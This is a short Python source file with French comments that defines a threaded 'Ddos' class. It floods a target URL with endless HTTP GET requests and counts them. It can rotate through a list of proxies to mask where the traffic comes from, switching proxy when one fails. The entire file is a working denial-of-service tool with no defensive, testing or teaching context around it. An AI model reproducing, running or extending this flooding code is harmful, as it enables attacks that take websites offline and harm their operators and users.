from threading import Thread
import time, requests

class Ddos(Thread):
    """Modules contenant les fonctionnalité de DDOS"""

    def __init__(self, url, proxies=None):
        '''Initialisation du thread et création des attributs de classe'''
        Thread.__init__(self)
        self.url = url
        self.numbers_request = 0
        self.proxy = proxies

    def run(self):
        """Code à exécuter au démarrrage du thread."""
        if self.proxy is not None:
            if len(self.proxy) > 0:
                first_proxy_in_list = self.proxy.pop(0)
                while 1:
                        try:
                            requests.get(self.url, proxies={"http": first_proxy_in_list, "https": first_proxy_in_list})
                            self.numbers_request +=1
                        except:
                            if len(self.proxy) > 0:
                                first_proxy_in_list = self.proxy.pop(0)
                            else:
                                break

        else:
            while 1:
                try:
                    requests.get(self.url)
                    self.numbers_request +=1
                except:
                    pass

